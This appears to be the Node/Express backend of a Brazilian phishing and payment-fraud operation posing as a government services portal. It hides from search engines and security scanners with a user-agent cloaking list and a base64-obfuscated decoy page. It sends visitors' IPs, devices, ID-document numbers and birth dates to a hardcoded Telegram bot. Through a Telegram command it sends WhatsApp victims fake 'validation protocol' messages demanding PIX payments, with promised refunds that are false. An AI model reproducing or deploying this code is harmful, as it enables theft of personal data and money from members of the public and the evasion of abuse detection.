import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import axios from "axios";
import fs from "fs";
import path from "path";
import { spawn, ChildProcess } from "child_process";

dotenv.config();

const app = express();
const port = process.env.PORT || 80;

// Config state
const configPath = path.join(process.cwd(), "config.json");
let currentConfig = {
  whatsappNumber: process.env.WHATSAPP_NUMBER || "5511971730325",
};

// Sessions state for Telegram tracking
const sessions = new Map<string, {
  messageId: number,
  startTime: number,
  lastHeartbeat: number,
  ip: string,
  device: string,
  location: string,
  converted: boolean,
  docValue: string,
  birthDate: string
}>();

// Bot states for interactive commands
const botStates = new Map<number, { action: string, data?: any }>();

// Multi-Bot Management
const botProcesses = new Map<string, ChildProcess>();
const MAX_SLOTS = 5;

function stopBot(id: string) {
  const proc = botProcesses.get(id);
  if (proc) {
    try { proc.kill(); } catch (e) { }
    botProcesses.delete(id);
  }
}

let isBotStarting = false;
function startBot(id: string = 'main') {
  if (isBotStarting && id === 'main') return;
  if (id === 'main') isBotStarting = true;
  
  stopBot(id);
  console.log(`🤖 [SISTEMA] Iniciando instância do robô: ${id}`);
  const proc = spawn('node', ['whatsapp-bot.cjs', `--id=${id}`], { stdio: 'inherit' });
  
  proc.on('exit', (code) => {
    console.log(`⚠️ [SISTEMA] Robô ${id} finalizado com código ${code}. Reiniciando em 5 segundos...`);
    setTimeout(() => startBot(id), 5000);
  });

  botProcesses.set(id, proc);
}

function resetBotSession(id: string) {
  stopBot(id);
  const sessionPath = path.join(process.cwd(), '.wwebjs_auth', `session-${id}`);
  if (fs.existsSync(sessionPath)) {
    try { fs.rmSync(sessionPath, { recursive: true, force: true }); } catch (e) { }
  }
  startBot(id);
}

if (fs.existsSync(configPath)) {
  const saved = JSON.parse(fs.readFileSync(configPath, "utf-8"));
  if (saved.whatsappNumber) currentConfig.whatsappNumber = saved.whatsappNumber;
}

if (!currentConfig.whatsappNumber) {
  currentConfig.whatsappNumber = "5511971730325"; // Número mestre de recuperação
}

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
const TELEGRAM_URL = `https://api.telegram.org/bot${TG_TOKEN}`;

// CORS — libera todas as origens em todas as rotas (incluindo preflight OPTIONS)
const corsOptions = {
  origin: "*",
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization", "X-Requested-With"],
  optionsSuccessStatus: 204,
};
app.use(cors(corsOptions));
app.options("*", cors(corsOptions));

// --- CLOAKING ENGINE (v5.0) ---
const BOT_UA_PATTERNS = [
  "googlebot", "adsbot", "bingbot", "yandex", "baiduspider", "facebookexternalhit",
  "twitterbot", "rogerbot", "linkedinbot", "embedly", "quora link preview",
  "showyoubot", "outbrain", "pinterest/0.", "developers.google.com/+/web/snippet",
  "slackbot", "vkShare", "W3C_Validator", "redditbot", "Applebot", "WhatsApp",
  "flipboard", "tumblr", "bitlybot", "SkypeShell", "bitlybot", "Zetabot",
  "facebookplatform", "chrome-lighthouse", "headlesschrome", "puppeteer",
  "selenium", "playwright", "python-requests", "curl", "wget", "postman",
  "insomnia", "scanner", "sqlmap", "nikto", "nmap", "burp"
];

function isBot(ua: string | undefined): boolean {
  if (!ua) return false;
  const lowUA = ua.toLowerCase();
  return BOT_UA_PATTERNS.some(pattern => lowUA.includes(pattern));
}

// Dummy page for bots (Camouflage)
const DUMMY_HTML = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${_d('U2VydmnDp29zIFDDumJsaWNvcyAtIFBvcnRhbCBkZSBBZ2VuZGFtZW50bw==')}</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f7f9; color: #333; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .container { max-width: 500px; padding: 40px; background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
        h1 { color: #003366; font-size: 24px; margin-bottom: 16px; }
        p { font-size: 16px; line-height: 1.5; color: #666; }
        .footer { margin-top: 30px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <div class="container">
        <h1>${_d('TWFudXRlbsOnw6NvIFByb2dyYW1hZGE=')}</h1>
        <p>${_d('UHJlemFkbyBjaWRhZMOjbywgbyBwb3J0YWwgZXN0w6EgcGFzc2FuZG8gcG9yIHVtYSBhdHVhbGl6YcOnw6NvIGRlIHNlZ3VyYW7Dp2Egb2JyaWdhdMOzcmlhIGVtIGNvbmZvcm1pZGFkZSBjb20gYXMgbm92YXMgZGlyZXRyaXplcyBkZSBwcm90ZcOnw6NvIGRlIGRhZG9zLg==')}</p>
        <p>${_d('TyBhY2Vzc28gc2Vyw6EgcmVzdGFiZWxlY2lkbyBlbSBicmV2ZS4gQWdyYWRlY2Vtb3MgYSBjb21wcmVlbnPDo28u')}</p>
        <div class="footer">${_d('wqkgMjAyNiBQb3J0YWwgZGUgU2VydmnDp29zIEdvdmVybmFtZW50YWlzIC0gVG9kb3Mgb3MgZGlyZWl0b3MgcmVzZXJ2YWRvcy4=')}</div>
    </div>
</body>
</html>
`;

// Bot detection middleware
app.use((req, res, next) => {
  const ua = req.headers["user-agent"];
  const botToken = req.headers["x-svr-bot-token"];
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
  
  // Bypass para o Robô da Shard Cloud (Identificação por Token ou User-Agent específico)
  const isOurBot = botToken === '8643978397' || (ua && ua.includes('SVR-BOT-NODE-RUNTIME'));

  // IMPORTANTE: Nunca aplicar camuflagem em rotas de API (se for nosso bot) ou arquivos estáticos
  if (req.url.startsWith('/api')) {
    if (isOurBot) return next();
    // Se for um "bot" estranho tentando acessar a API, podemos decidir se bloqueamos ou deixamos passar.
    // Para segurança total, vamos deixar passar apenas se não for um bot conhecido de scanner.
  }

  if (req.url.includes('.')) {
    return next();
  }

  if (isBot(ua) && !isOurBot) {
    console.log(`🛡️ [CLOAKING] Bot detectado e redirecionado para dummy: ${ua} (IP: ${ip})`);
    return res.status(200).send(DUMMY_HTML);
  }
  next();
});

// Logging middleware
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

app.use(express.json());
app.use(express.static(path.join(process.cwd(), 'dist')));

// --- OBFUSCATION LAYER ---
const _d = (b: string) => Buffer.from(b, 'base64').toString('utf-8');

// Helper to send/edit Telegram messages
async function sendTelegram(text: string, messageId?: number, replyMarkup?: any) {
  if (!TG_TOKEN || !CHAT_ID) {
    console.error("❌ [TELEGRAM] Token ou Chat ID não configurados.");
    return null;
  }

  try {
    const url = messageId
      ? `${TELEGRAM_URL}/editMessageText`
      : `${TELEGRAM_URL}/sendMessage`;

    const payload: any = {
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML'
    };
    if (messageId) payload.message_id = messageId;
    if (replyMarkup) payload.reply_markup = replyMarkup;

    const res = await axios.post(url, payload);
    return res.data.result.message_id;
  } catch (err: any) {
    console.error(`❌ [TELEGRAM] Erro ao enviar/editar mensagem: ${err.response?.data?.description || err.message}`);
    return null;
  }
}

// 1. Session Start (Initial Visit)
app.post("/api/v1/session/start", async (req, res) => {
  const { device, location, userId } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";

  if (sessions.has(userId)) return res.json({ status: "exists" });

  const startTime = Date.now();
  const message = `<b>${_d('8PCfuyBOT1ZPIFZJU0lUQU5URSBPTkxJTkU=')}</b>\n\n` +
    `<b>IP:</b> ${ip}\n` +
    `<b>${_d('RGlzcG9zaXRpdm86')}</b> ${device}\n` +
    `<b>${_d('TG9jYWw6')}</b> ${location || 'GEO_LOC_055'}\n` +
    `<b>Status:</b> 🟢 ${_d('TmF2ZWdhbmRvIG5vIHNpdGUuLi4=')}\n` +
    `<b>${_d('SW7DrWNpbzo=')}</b> ${new Date(startTime).toLocaleTimeString()}`;

  console.log(`👤 [RUN_ENV_SYS] ${_d('Tm92byB2aXNpdGFudGU6')} ${userId} (${ip})`);
  const messageId = await sendTelegram(message);
  
  sessions.set(userId, {
    messageId: messageId || 0,
    startTime,
    lastHeartbeat: startTime,
    ip: String(ip),
    device,
    location: location || 'Brasil',
    converted: false,
    docValue: "",
    birthDate: ""
  });

  res.json({ status: "started", userId });
});

// 2. Session Heartbeat
app.post("/api/v1/session/heartbeat", (req, res) => {
  const { userId } = req.body;
  const session = sessions.get(userId);
  if (session) {
    session.lastHeartbeat = Date.now();
    res.json({ status: "alive" });
  } else {
    res.json({ status: "not_found" });
  }
});

// 3. Conversion (Went to WhatsApp)
app.post("/api/v1/session/convert", async (req, res) => {
  const { userId, details } = req.body;
  const session = sessions.get(userId);
  if (session && !session.converted) {
    session.converted = true;
    session.docValue = details.docValue;
    session.birthDate = details.birthDate;
    const timeSpent = Math.floor((Date.now() - session.startTime) / 1000);
    const message = `<b>${_d('8J+UpSBDTElFTlRVIEZPSSBQQVJBIE8gV0hBVFNBUFA=')}</b>\n\n` +
      `<b>IP:</b> ${session.ip}\n` +
      `<b>${_d('RG9jdW1lbnRvOg==')}</b> ${details.docValue}\n` +
      `<b>${_d('VGVtcG8gbm8gc2l0ZTo=')}</b> ${Math.floor(timeSpent / 60)}m ${timeSpent % 60}s\n` +
      `<b>Status:</b> ✅ ${_d('UkVESVJFQ0lPTkFETw==')}`;

    console.log(`🔥 [CONVERSÃO] Lead #${userId} ${_d('Zm9pIHBhcmEgbyBXaGF0c0FwcC4=')}`);
    await sendTelegram(message, session.messageId || undefined);
    res.json({ status: "converted" });
  } else {
    res.json({ status: "ignored" });
  }
});

// 4. Session End (Explicit Exit)
app.post("/api/v1/session/end", async (req, res) => {
  const { userId } = req.body;
  const session = sessions.get(userId);

  res.json({ status: "ok" }); // Responde rápido pro beacon não travar

  if (!session || session.converted) return; // Já convertido = já notificado

  const timeSpent = Math.floor((Date.now() - session.startTime) / 1000);
  const mins = Math.floor(timeSpent / 60);
  const secs = timeSpent % 60;

  const message = `<b>🚪 VISITANTE SAIU DO SITE</b>\n\n` +
    `<b>IP:</b> ${session.ip}\n` +
    `<b>Dispositivo:</b> ${session.device}\n` +
    `<b>Tempo no site:</b> ${mins}m ${secs}s\n` +
    `<b>Status:</b> 🔴 Saiu sem converter`;

  console.log(`🔴 [SAÍDA] Lead #${userId} saiu após ${mins}m ${secs}s.`);
  await sendTelegram(message, session.messageId || undefined);
  sessions.delete(userId);
});

// 5. Metrics Log (General)
app.post("/api/v1/metrics/log", async (req, res) => {
  const { payload } = req.body;
  if (!payload) return res.sendStatus(200);
  try {
    const decoded = JSON.parse(Buffer.from(payload, 'base64').toString());
    await sendTelegram(decoded.message);
  } catch (e) { }
  res.json({ status: "ok" });
});

app.get("/api/v1/session/data/:userId", (req, res) => {
  const session = sessions.get(req.params.userId);
  if (session) {
    res.json({ docValue: session.docValue, birthDate: session.birthDate });
  } else {
    res.status(404).json({ error: "not_found" });
  }
});

app.get("/api/config", (req, res) => {
  res.json(currentConfig);
});

// Cleanup task
setInterval(async () => {
  const now = Date.now();
  for (const [userId, session] of sessions.entries()) {
    if (!session.converted && now - session.lastHeartbeat > 60000) {
      const timeSpent = Math.floor((now - session.startTime) / 1000);
      const message = `<b>👤 VISITANTE SAIU (Sem conversão)</b>\n\n` +
        `<b>IP:</b> ${session.ip}\n` +
        `<b>Tempo:</b> ${Math.floor(timeSpent / 60)}m ${timeSpent % 60}s\n` +
        `<b>Status:</b> 🔴 Offline`;
      
      console.log(`🔴 [SISTEMA] Visitante #${userId} desconectou.`);
      await sendTelegram(message, session.messageId || undefined);
      sessions.delete(userId);
    }
  }
}, 30000);

// --- Telegram Bot Interactive Polling ---
async function startTelegramPolling() {
  if (!TG_TOKEN) {
    console.log("⚠️ [TELEGRAM] TELEGRAM_BOT_TOKEN não configurado. Polling desativado.");
    return;
  }

  let lastUpdateId = 0;
  console.log("🤖 [SISTEMA] Telegram Polling iniciado com sucesso.");

  while (true) {
    try {
      const response = await axios.get(`${TELEGRAM_URL}/getUpdates`, {
        params: { offset: lastUpdateId + 1, timeout: 30 }
      });

      for (const update of response.data.result) {
        lastUpdateId = update.update_id;
        const cb = update.callback_query;
        const msg = update.message || cb?.message;
        const chatId = msg?.chat?.id;
        const userId = msg?.from?.id || cb?.from?.id;

        if (!userId) continue;

        // Verificar se a mensagem é do admin autorizado
        if (CHAT_ID && String(chatId) !== String(CHAT_ID)) {
          console.log(`⚠️ [TELEGRAM] Chat ID não autorizado: ${chatId} (esperado: ${CHAT_ID})`);
          continue;
        }

        const state = botStates.get(userId);
        let text = msg?.text || "";

        if (cb) {
          text = cb.data;
          await axios.post(`${TELEGRAM_URL}/answerCallbackQuery`, { callback_query_id: cb.id });
        }

        const command = text.split("@")[0].trim().toLowerCase();

        if (command === "/ping" || command === "/teste") {
          await sendTelegram("🏓 <b>PONG!</b>\nO sistema de notificações e controle está operacional.");
          continue;
        }

        if (command === "/status") {
          const onlineCount = Array.from(sessions.values()).filter(s => !s.converted).length;

          let slotsInfo = "";
          for (let i = 1; i <= MAX_SLOTS; i++) {
            const id = i === 1 ? 'main' : `parceiro${i}`;
            let status = "⚪ Offline";
            try {
              const statusPath = path.join(process.cwd(), `bot-status-${id}.json`);
              if (fs.existsSync(statusPath)) {
                const data = JSON.parse(fs.readFileSync(statusPath, 'utf-8'));
                if (data.status === 'CONNECTED') status = `🟢 Online (${data.adminName})`;
                else if (data.status === 'WAITING_QR') status = "🟡 Aguardando QR";
              }
            } catch (e) { }
            slotsInfo += `🔹 <b>Slot ${i}:</b> ${status}\n`;
          }

          await sendTelegram(`📊 <b>STATUS DO PORTAL SVR</b>\n\n` +
            `📱 <b>WhatsApp Master:</b> <code>${currentConfig.whatsappNumber}</code>\n` +
            `🤖 <b>Atendentes Ativos:</b>\n${slotsInfo}\n` +
            `👥 <b>Usuários no Site:</b> ${onlineCount}\n\n` +
            `🚀 <i>Use /pix para gerar protocolos.</i>`);
          continue;
        }

        if (command.startsWith("/setzap")) {
          const parts = text.split(" ");
          if (parts.length < 2) {
            await sendTelegram("❌ Use: <code>/setzap 5511...</code>");
          } else {
            const newNum = parts[1].replace(/\D/g, "");
            botStates.set(userId, { action: "confirm_zap", data: newNum });
            await sendTelegram(`⚠️ <b>CONFIRMAR MUDANÇA?</b>\nDestino: <code>${newNum}</code>\nResponda <b>SIM</b> para confirmar.`);
          }
          continue;
        }

        if (state?.action === "confirm_zap" && text.toUpperCase() === "SIM") {
          currentConfig.whatsappNumber = state.data;
          fs.writeFileSync(configPath, JSON.stringify(currentConfig));
          await sendTelegram(`✅ Número atualizado: <code>${state.data}</code>`);
          botStates.delete(userId);
          continue;
        }

        if (command.startsWith("/pix")) {
          const parts = text.split(" ");
          const valorInput = parts[1];
          let telefone = parts[2];

          if (!valorInput) {
            await sendTelegram("❌ Use: <code>/pix [valor] [telefone]</code>");
            continue;
          }

          const valorNumeric = parseFloat(valorInput.replace(',', '.'));
          
          if (!telefone) {
            try {
              if (fs.existsSync('last-lead.json')) {
                const lastLeadData = JSON.parse(fs.readFileSync('last-lead.json', 'utf-8'));
                telefone = lastLeadData.chatId;
              }
            } catch (e) { }
          }

          if (!telefone) {
            await sendTelegram("❌ Lead não identificado. Use: <code>/pix 97.50 5511...</code>");
            continue;
          }

          await sendTelegram(`🔍 <b>PROCESSANDO PROTOCOLO...</b>\nLead: <code>${telefone}</code>\nValor: R$ ${valorNumeric.toFixed(2)}`);

          try {
            const key = process.env.SVR_CORE_P_PROVIDER;
            const secret = process.env.SVR_CORE_S_AUTH;
            const endpoint = process.env.SVR_CORE_GATEWAY;
            
            if (!key || !secret || !endpoint) throw new Error("Chaves SVR_CORE não configuradas.");

            const auth = Buffer.from(`${key}:${secret}`).toString('base64');
            const pixRes = await axios.post(endpoint, {
              amount: Math.round(valorNumeric * 100),
              currency: "BRL",
              paymentMethod: "PIX",
              customer: { name: "Cliente SVR", document: { number: "00000000000", type: "CPF" } }
            }, {
              headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/json' }
            });

            const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode;
            const transId = pixRes.data.id || pixRes.data.transactionId;
            const protocolId = Math.random().toString(36).substring(7).toUpperCase();

            // Mensagem 1: Protocolo Formal (Camuflado)
            const formalMessage = `🔐 *${_d('U1ZSIC0gU0lTVEVNQSBERSBWQUxJREFNw4fDg08gQ1JJUFRPR1LDgUZJQ0E=')}* 🔐\n\n` +
              `${_d('T28gc2lzdGVtYSBpZGVudGlmaWNvdSB1bWEgcGVuZMOqbmNpYSBkZSBhc3NlZ3VyYW1lbnRvIG5hIGNvbnRhIGRlIGRlc3Rpbm8u')}\n\n` +
              `🖥️ *${_d('RVNUQURPIERPIFNJU1RFTUE6')}*\n` +
              `\`\`\`\n` +
              `ID: 0x${protocolId}\n` +
              `STATUS: ${_d('QUdVQVJEQU5ET19WQUxJREFNw4fDg09fSEFTSA==')}\n` +
              `TYPE: ${_d('QVVURU5USUNBw4fDg09fREVfREVTVElOTw==')}\n` +
              `\`\`\`\n\n` +
              `👇 *${_d('Q09QSUUgTyBIQVNIIEFCQUlYTyBFIEVNIFNFR1VJREEgSU1QT1JURSBOTyBTRVUgQVBQIEJBTkPDIFJJTyAoUGl4IENvcGlhIGUgQ29sYSk6')}*`;

            // Envia o Protocolo e depois o Código Isolado (para cópia rápida)
            const ts = Date.now();
            fs.writeFileSync(`cmd-send-${ts}.json`, JSON.stringify({ to: telefone, message: formalMessage }));
            fs.writeFileSync(`cmd-send-${ts + 500}.json`, JSON.stringify({ to: telefone, message: pixCode }));
            
            const adminMsg = `✅ <b>PIX ENVIADO AO WHATSAPP!</b>\n📱 <b>Lead:</b> <code>${telefone}</code>\n🆔 <b>ID:</b> <code>${transId}</code>`;
            const keyboard = {
              inline_keyboard: [[
                { text: "🔄 Verificar Pagamento", callback_data: `check_pix:${transId}:${telefone}:${valorNumeric}:${valorTotalEstimado}` },
                { text: "➕ Gerar Novo", callback_data: `/pix ${valorNumeric} ${telefone}` }
              ]]
            };
            await sendTelegram(adminMsg, undefined, keyboard);
          } catch (e: any) {
            await sendTelegram(`❌ <b>ERRO NA GERAÇÃO:</b>\n<code>${e.message}</code>`);
          }
          continue;
        }

        if (cb && cb.data.startsWith("check_pix:")) {
          const [, transId, phone, valor, total] = cb.data.split(":");
          try {
            const key = process.env.SVR_CORE_P_PROVIDER;
            const secret = process.env.SVR_CORE_S_AUTH;
            const auth = Buffer.from(`${key}:${secret}`).toString('base64');
            const endpoint = (process.env.SVR_CORE_GATEWAY || '').replace('/transactions', `/${transId}`);
            
            const res = await axios.get(endpoint, { headers: { 'Authorization': `Basic ${auth}` } });
            const status = res.data.status || res.data.paymentStatus;

            if (status === "PAID" || status === "confirmed" || status === "SUCESSO") {
              const successMsg = `✅ *PARABÉNS! ETAPA DE VALIDAÇÃO CONCLUÍDA* ✅\n\nO valor de *R$ ${parseFloat(valor).toFixed(2)}* foi segurado e será reembolsado junto ao saldo total de *R$ ${parseFloat(total).toFixed(2)}* em instantes.`;
              fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: phone, message: successMsg }));
              await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\nLead: ${phone}`);
            } else {
              await sendTelegram(`⏳ <b>AGUARDANDO:</b> O lead ainda não pagou.`);
            }
          } catch (e: any) {
            await sendTelegram(`❌ Erro na consulta.`);
          }
          continue;
        }

        if (command === "/painel" || command === "/start") {
          const menu = `🚀 <b>PAINEL SVR OPERACIONAL</b>\n\n/status - Ver sistema\n/pix [valor] - Gerar protocolo\n/setzap [n] - Mudar WhatsApp\n/teste - Testar conexão`;
          await sendTelegram(menu);
          continue;
        }
      }
    } catch (err: any) {
      console.error("❌ [TELEGRAM] Erro no loop de polling:", err.message);
      await new Promise(r => setTimeout(r, 5000));
    }
  }
}

app.get('*', (req, res) => {
  const distPath = path.join(process.cwd(), 'dist', 'index.html');
  if (fs.existsSync(distPath)) res.sendFile(distPath);
  else res.status(404).send('Frontend não compilado.');
});

function mask(str: string | undefined) {
  if (!str) return "NÃO CONFIGURADO";
  return str.substring(0, 6) + "..." + str.substring(str.length - 4);
}

app.listen(Number(port), "0.0.0.0", () => {
  console.log(`\n🚀 [SVR SYSTEM] ONLINE - Porta ${port}`);
  console.log(`---------------------------------------------`);
  console.log(`📡 CORE_URL: ${process.env.SVR_SYS_CORE_URL}`);
  console.log(`🤖 TG_TOKEN: ${mask(process.env.TELEGRAM_BOT_TOKEN)}`);
  console.log(`💬 CHAT_ID:  ${mask(process.env.TELEGRAM_CHAT_ID)}`);
  console.log(`💰 GATEWAY:  ${process.env.SVR_CORE_GATEWAY}`);
  console.log(`---------------------------------------------\n`);
  
  startTelegramPolling();
  // startBot(); // DESATIVADO NA HOSTINGER (O robô está na Shard Cloud)
});

